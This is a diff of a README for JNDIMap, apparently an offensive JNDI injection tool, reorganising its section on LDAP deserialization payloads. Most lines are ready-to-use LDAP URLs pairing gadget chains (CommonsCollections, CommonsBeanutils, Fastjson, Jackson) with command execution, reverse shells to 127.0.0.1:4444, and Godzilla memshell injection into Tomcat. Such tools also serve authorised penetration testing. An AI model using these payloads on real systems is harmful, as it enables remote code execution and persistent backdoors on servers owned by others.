@@ -503,39 +503,47 @@ Supports Java deserialization via LDAP and LDAP protocols (RMI protocol is not s
 JNDIMap has built-in the following gadgets, and also supports custom data deserialization
 
 - CommonsCollections K1-K4
-- CommonsBeanutils183
-- CommonsBeanutils194
-- Fastjson1 (1.2.x)
-- Fastjson2 (2.0.x)
+- CommonsBeanutils 183, 194
+- Fastjson1 (1.2.x), Fastjson2 (2.0.x)
 - Jackson
 
-```bash
-# custom data deserialization
+### Custom Data Deserialization
 
+```bash
 # load via URL parameters
 ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialized-data>
 # load from the server running JNDIMap
 ldap://127.0.0.1:1389/Deserialize/FromFile/payload.ser # the path is relative to the current directory
 ldap://127.0.0.1:1389/Deserialize/FromFile/<base64-url-encoded-path-to-serialized-data>
+```
 
-# CommonsCollectionsK1 deserialization (3.1 + TemplatesImpl), supports command execution, reverse shell and memshell injection
+### CommonsCollections
+
+Based on versions 3.1 and 4.0, and whether they depend on TemplatesImpl, they are divided into four versions: K1-K4
+
+```bash
+# CommonsCollectionsK1 (3.1 + TemplatesImpl), supports command execution, reverse shell and memshell injection
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/MemShell/Tomcat/Godzilla/Filter
 
-# CommonsCollectionsK2 deserialization (4.0 + TemplatesImpl), same as above
+# CommonsCollectionsK2 (4.0 + TemplatesImpl), same as above
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator
 
-# CommonsCollectionsK3 deserialization (3.1 + Runtime.exec), only supports command execution
+# CommonsCollectionsK3 (3.1 + Runtime.exec), only supports command execution
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator
 
-# CommonsCollectionsK4 deserialization (4.0 + Runtime.exec), same as above
+# CommonsCollectionsK4 (4.0 + Runtime.exec), same as above
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
+```
 
-# CommonsBeanutils deserialization
-# No need for commons-collections dependency, use TemplatesImpl, support command execution, reverse shell and memshell injection
-# According to the different serialVersionUID of BeanComparator, it is divided into two versions: 1.8.3 and 1.9.4
+### CommonsBeanutils
 
+No need for commons-collections dependency, use TemplatesImpl
+
+According to the different serialVersionUID of BeanComparator, it is divided into two versions: 1.8.3 and 1.9.4
+
+```bash
 # 1.8.3
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444
@@ -545,10 +553,29 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/MemShell/Tomcat/Godzilla/F
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/MemShell/Tomcat/Godzilla/Filter
+```
 
-# Jackson deserialization
-# Use JdkDynamicAopProxy to optimize instability issues, need spring-aop dependency
+### Fastjson
 
+It comes in two versions: 1.2.x and 2.0.x
+
+```bash
+# Fastjson1: all versions (1.2.x)
+ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Fastjson1/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Fastjson1/MemShell/Tomcat/Godzilla/Filter
+
+# Fastjson2: <= 2.0.26
+ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Fastjson2/MemShell/Tomcat/Godzilla/Filter
+```
+
+### Jackson
+
+Use JdkDynamicAopProxy to optimize instability issues, need spring-aop dependency
+
+```bash
 # for JDK 8
 ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
@@ -566,18 +593,6 @@ ldap://127.0.0.1:1389/Deserialize/Jackson17A/MemShell/Tomcat/Godzilla/Filter
 ldap://127.0.0.1:1389/Deserialize/Jackson17B/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson17B/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Deserialize/Jackson17B/MemShell/Tomcat/Godzilla/Filter
-
-# Fastjson deserialization
-
-# Fastjson1: all versions (1.2.x)
-ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/Fastjson1/ReverseShell/127.0.0.1/4444
-ldap://127.0.0.1:1389/Deserialize/Fastjson1/MemShell/Tomcat/Godzilla/Filter
-
-# Fastjson2: <= 2.0.26
-ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
-ldap://127.0.0.1:1389/Deserialize/Fastjson2/MemShell/Tomcat/Godzilla/Filter
 ```
 
 ## Script
